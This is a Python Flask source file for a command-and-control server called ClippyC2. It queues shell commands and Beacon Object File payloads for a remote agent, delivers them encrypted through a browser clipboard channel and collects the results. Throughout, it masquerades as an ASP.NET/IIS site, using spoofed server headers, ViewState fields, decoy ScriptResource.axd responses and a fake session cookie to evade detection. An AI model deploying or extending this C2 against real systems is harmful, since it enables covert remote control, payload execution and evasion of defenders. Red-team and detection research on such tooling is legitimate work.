import base64
import hmac
import os
import secrets
import sys
import time
from collections import defaultdict, deque

from flask import Flask, Response, jsonify, make_response, redirect, render_template, request

from bof_args import pack_string_args
from crypto import decrypt, encrypt, load_key
from db import AmbiguousCommandId, CommandStore
from protocol import (
    BOF_MAX_OBJECT_BYTES,
    QueuedCommand,
    encode_bof_object,
    parse_result_payload,
    validate_coff_object,
)
from viewstate import (
    build_script_resource_response,
    generate_generator,
    unwrap_encrypted,
    wrap_encrypted,
)

DB_PATH = os.environ.get("CLIPPYC2_DB")
OPERATOR_PASSWORD = os.environ.get("CLIPPYC2_OPERATOR_PASSWORD")
BROWSER_PASSWORD = os.environ.get("CLIPPYC2_BROWSER_PASSWORD")
ENCRYPTION_KEY_B64 = os.environ.get("CLIPPYC2_ENCRYPTION_KEY")
BROWSER_TOKEN = secrets.token_urlsafe(32)
VIEWSTATE_GENERATOR = generate_generator()
HOST = os.environ.get("CLIPPYC2_HOST")
PORT = int(os.environ.get("CLIPPYC2_PORT", "0"))
POLL_INTERVAL_SEC = int(os.environ.get("CLIPPYC2_POLL_INTERVAL", "0"))
DEBUG = os.environ.get("FLASK_DEBUG") == "1"
PUSH_RATE_LIMIT = int(os.environ.get("CLIPPYC2_PUSH_RATE_LIMIT", "0"))
SESSION_COOKIE = "ASP.NET_SessionId"
USE_SSL = os.environ.get("CLIPPYC2_SSL") == "1"

if not OPERATOR_PASSWORD:
    sys.exit("CLIPPYC2_OPERATOR_PASSWORD is required (set in .env)")
if not BROWSER_PASSWORD:
    sys.exit("CLIPPYC2_BROWSER_PASSWORD is required (set in .env)")
if not ENCRYPTION_KEY_B64:
    sys.exit("CLIPPYC2_ENCRYPTION_KEY is required (set in .env)")
if not HOST:
    sys.exit("CLIPPYC2_HOST is required (set in .env)")
if not PORT:
    sys.exit("CLIPPYC2_PORT is required (set in .env)")
if not POLL_INTERVAL_SEC:
    sys.exit("CLIPPYC2_POLL_INTERVAL is required (set in .env)")
if not PUSH_RATE_LIMIT:
    sys.exit("CLIPPYC2_PUSH_RATE_LIMIT is required (set in .env)")
if not DB_PATH:
    sys.exit("CLIPPYC2_DB is required (set in .env)")

try:
    ENCRYPTION_KEY = load_key(ENCRYPTION_KEY_B64)
except ValueError as exc:
    sys.exit(f"Invalid CLIPPYC2_ENCRYPTION_KEY: {exc}")

app = Flask(__name__)
app.config["JSON_AS_ASCII"] = False
if not USE_SSL:
    from werkzeug.middleware.proxy_fix import ProxyFix

    app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

store = CommandStore(DB_PATH)

command_queue: deque[QueuedCommand] = deque()
in_flight: QueuedCommand | None = None
last_server_text = ""
last_server_command_id = ""
last_client_result = ""
last_result_command = ""
last_result_id = ""
last_poll_at: float | None = None
last_checkin_at: float | None = None
last_command_at: float | None = None
push_attempts: dict[str, list[float]] = defaultdict(list)


def check_operator_auth() -> bool:
    password = request.headers.get("X-Auth", "")
    return hmac.compare_digest(password, OPERATOR_PASSWORD)


def check_browser_auth() -> bool:
    session_id = request.cookies.get(SESSION_COOKIE, "")
    return hmac.compare_digest(session_id, BROWSER_TOKEN)


def deny_browser() -> Response:
    return Response(
        "//Version:4.0.30319\r\n(function(){});\r\n",
        status=200,
        mimetype="application/x-javascript",
    )


def deny_operator():
    return jsonify(status="error", message="Authentication required"), 401


BROWSER_PATHS = {"/", "/Default.aspx", "/ScriptResource.axd"}


def check_push_rate_limit() -> bool:
    client = request.headers.get("X-Forwarded-For", request.remote_addr or "unknown").split(",")[0].strip()
    now = time.time()
    window = push_attempts[client]
    push_attempts[client] = [stamp for stamp in window if now - stamp < 60]
    if len(push_attempts[client]) >= PUSH_RATE_LIMIT:
        return False
    push_attempts[client].append(now)
    return True


def lookup_command_text(command_id: str) -> str:
    if in_flight and in_flight.id == command_id:
        return in_flight.command
    for item in command_queue:
        if item.id == command_id:
            return item.command
    return store.get_command_text(command_id)


def complete_command(command_id: str) -> None:
    global in_flight
    if in_flight and in_flight.id == command_id:
        if command_queue and command_queue[0].id == command_id:
            command_queue.popleft()
        in_flight = None


def record_command(
    item: QueuedCommand,
    bof_blob: bytes | None = None,
    bof_args: bytes | None = None,
) -> None:
    global last_server_text, last_server_command_id
    last_server_text = item.command
    last_server_command_id = item.id
    store.record_command(
        item.id,
        item.command,
        command_type=item.type,
        bof_blob=bof_blob,
        bof_args=bof_args,
    )
    if DEBUG:
        print(f"command {item.id} [{item.type}] {item.command}")


def record_result(command_id: str, command: str, result: str) -> bool:
    global last_result_id, last_result_command, last_client_result
    if not store.record_result(command_id, command, result):
        return False
    last_result_id = command_id
    last_result_command = command
    last_client_result = result
    if DEBUG:
        print(f"result {command_id} ({len(result)} bytes)")
    return True


def set_session_cookie(response):
    response.set_cookie(
        SESSION_COOKIE,
        BROWSER_TOKEN,
        httponly=True,
        secure=request.is_secure,
        samesite="Strict",
        path="/",
    )
    return response


@app.after_request
def asp_net_headers(response):
    if request.path in BROWSER_PATHS or request.path.endswith(".axd"):
        response.headers["Server"] = "Microsoft-IIS/10.0"
        response.headers["X-AspNet-Version"] = "4.0.30319"
        response.headers["X-Powered-By"] = "ASP.NET"
    return response


@app.route("/")
@app.route("/Default.aspx", methods=["GET"])
def default_page():
    if request.args.get("__VIEWSTATE") or request.args.get("__EVENTTARGET"):
        return handle_postback()

    if check_browser_auth():
        response = make_response(
            render_template(
                "index.html",
                poll_interval_ms=POLL_INTERVAL_SEC * 1000,
                viewstate_generator=VIEWSTATE_GENERATOR,
                encryption_key_b64=ENCRYPTION_KEY_B64,
            )
        )
        return set_session_cookie(response)

    portal_key = request.args.get("portal_key", "")
    if portal_key:
        if hmac.compare_digest(portal_key, BROWSER_PASSWORD):
            response = make_response(redirect("/Default.aspx"))
            return set_session_cookie(response)
        return (
            render_template("login.html", error="The user name or password is incorrect."),
            401,
        )

    return render_template("login.html", error=None)


def handle_postback():
    if not check_browser_auth():
        return Response("1|#||", mimetype="text/plain")

    event_target = request.args.get("__EVENTTARGET", "")
    viewstate = request.args.get("__VIEWSTATE", "")

    if event_target.endswith("$btnReset"):
        return Response("1|#||", mimetype="text/plain")

    if not viewstate:
        return Response("1|#||", mimetype="text/plain")

    if not check_push_rate_limit():
        return Response("1|#||", mimetype="text/plain")

    try:
        plaintext = unwrap_encrypted(viewstate, lambda blob: decrypt(blob, ENCRYPTION_KEY))
    except Exception as exc:
        if DEBUG:
            print(f"Error decrypting viewstate payload: {exc}")
        return Response("1|#||", mimetype="text/plain")

    if not plaintext:
        return Response("1|#||", mimetype="text/plain")

    parsed = parse_result_payload(plaintext)
    if not parsed:
        return Response("1|#||", mimetype="text/plain")

    result_id, output = parsed
    global last_checkin_at
    last_checkin_at = time.time()

    if store.has_result(result_id):
        complete_command(result_id)
        return Response("1|#||", mimetype="text/plain")

    command_text = lookup_command_text(result_id)
    record_result(result_id, command_text, output)
    complete_command(result_id)
    return Response("1|#||", mimetype="text/plain")


@app.route("/ScriptResource.axd", methods=["GET"])
def script_resource():
    if not check_browser_auth():
        return deny_browser()

    global last_poll_at, in_flight
    last_poll_at = time.time()

    if in_flight:
        try:
            fields = wrap_encrypted(
                in_flight.to_delivery_json(),
                lambda text: encrypt(text, ENCRYPTION_KEY),
            )
            body = build_script_resource_response(fields["__VIEWSTATE"], fields["__VIEWSTATEGENERATOR"])
        except Exception as exc:
            if DEBUG:
                print(f"Error building script resource: {exc}")
            body = "//Version:4.0.30319\r\n(function(){});\r\n"
    elif command_queue:
        in_flight = command_queue[0]
        try:
            fields = wrap_encrypted(
                in_flight.to_delivery_json(),
                lambda text: encrypt(text, ENCRYPTION_KEY),
            )
            body = build_script_resource_response(fields["__VIEWSTATE"], fields["__VIEWSTATEGENERATOR"])
        except Exception as exc:
            in_flight = None
            if DEBUG:
                print(f"Error building script resource: {exc}")
            body = "//Version:4.0.30319\r\n(function(){});\r\n"
    else:
        body = "//Version:4.0.30319\r\n(function(){});\r\n"

    return Response(body, mimetype="application/x-javascript")


@app.route("/server", methods=["GET"])
def set_server_text():
    if not check_operator_auth():
        return deny_operator()

    global last_command_at
    text = request.args.get("cmd", "")
    command_id = ""
    if text:
        item = QueuedCommand.create_shell(text)
        command_queue.append(item)
        command_id = item.id
        last_command_at = time.time()
        record_command(item)
    return jsonify(
        status="success",
        command_id=command_id,
        text_received=text,
        queue_length=len(command_queue),
    )


@app.route("/bof", methods=["POST"])
def queue_bof():
    if not check_operator_auth():
        return deny_operator()

    global last_command_at
    object_bytes: bytes | None = None
    name = ""
    args_bytes = b""
    arg_values: list[str] = []

    if request.content_type and "multipart/form-data" in request.content_type:
        upload = request.files.get("file")
        if not upload:
            return jsonify(status="error", message="missing BOF file"), 400
        name = upload.filename or "bof.o"
        object_bytes = upload.read()
        raw_args = request.form.get("args", "")
        if raw_args:
            arg_values = raw_args.split("\0") if "\0" in raw_args else [raw_args]
    else:
        payload = request.get_json(silent=True) or {}
        name = str(payload.get("name", "bof.o"))
        object_b64 = str(payload.get("object_b64", ""))
        if not object_b64:
            return jsonify(status="error", message="missing object_b64"), 400
        try:
            object_bytes = base64.b64decode(object_b64, validate=True)
        except Exception:
            return jsonify(status="error", message="invalid object_b64"), 400
        args_b64 = str(payload.get("args_b64", ""))
        if args_b64:
            try:
                args_bytes = base64.b64decode(args_b64, validate=True)
            except Exception:
                return jsonify(status="error", message="invalid args_b64"), 400
        arg_list = payload.get("args")
        if isinstance(arg_list, list):
            arg_values = [str(value) for value in arg_list]

    if object_bytes is None:
        return jsonify(status="error", message="missing BOF object"), 400

    try:
        validate_coff_object(object_bytes)
    except ValueError as exc:
        return jsonify(status="error", message=str(exc)), 400

    if len(object_bytes) > BOF_MAX_OBJECT_BYTES:
        return jsonify(status="error", message=f"BOF exceeds {BOF_MAX_OBJECT_BYTES} bytes"), 400

    if arg_values and not args_bytes:
        args_bytes = pack_string_args(arg_values)

    object_b64 = encode_bof_object(object_bytes)
    args_b64 = base64.b64encode(args_bytes).decode("ascii") if args_bytes else ""
    delivery_json = QueuedCommand.create_bof(name, object_b64, args_b64).to_delivery_json()
    if len(delivery_json) > BOF_MAX_OBJECT_BYTES * 2:
        return jsonify(status="error", message="BOF delivery payload too large for clipboard channel"), 400

    item = QueuedCommand.create_bof(name, object_b64, args_b64)
    command_queue.append(item)
    last_command_at = time.time()
    record_command(item, bof_blob=object_bytes, bof_args=args_bytes or None)

    return jsonify(
        status="success",
        command_id=item.id,
        name=name,
        type=item.type,
        queue_length=len(command_queue),
    )


@app.route("/tasks", methods=["GET"])
def get_tasks():
    if not check_operator_auth():
        return deny_operator()

    command_id = request.args.get("id", "").strip()
    if command_id:
        try:
            entry = store.get_command(command_id)
        except AmbiguousCommandId as exc:
            return jsonify(
                status="error",
                message="ambiguous command id prefix",
                matches=exc.matches,
            ), 400
        if not entry:
            return jsonify(status="error", message="command not found"), 404
        return jsonify(status="success", **entry)

    return jsonify(status="success", commands=store.list_commands())


@app.route("/status", methods=["GET"])
def get_status():
    if not check_operator_auth():
        return deny_operator()
    active = in_flight or (command_queue[0] if command_queue else None)
    return jsonify(
        active_command=active.to_dict() if active else None,
        in_flight_command=in_flight.to_dict() if in_flight else None,
        queued_commands=[item.to_dict() for item in command_queue],
        queue_length=len(command_queue),
        last_command=last_server_text,
        last_command_id=last_server_command_id,
        last_result_command=last_result_command,
        last_result_id=last_result_id,
        last_result=last_client_result,
        last_poll_at=last_poll_at,
        last_checkin_at=last_checkin_at,
        last_command_at=last_command_at,
        poll_interval_sec=POLL_INTERVAL_SEC,
    )


@app.errorhandler(404)
def missing_resource(_error):
    if request.path.endswith(".axd"):
        return deny_browser()
    return Response("Not Found", status=404)


if __name__ == "__main__":
    run_kwargs = {"host": HOST, "port": PORT, "debug": DEBUG}
    if USE_SSL:
        try:
            import OpenSSL  # noqa: F401
        except ImportError:
            sys.exit("pyOpenSSL is required when CLIPPYC2_SSL=1")
        app.run(**run_kwargs, ssl_context="adhoc")
    else:
        app.run(**run_kwargs)
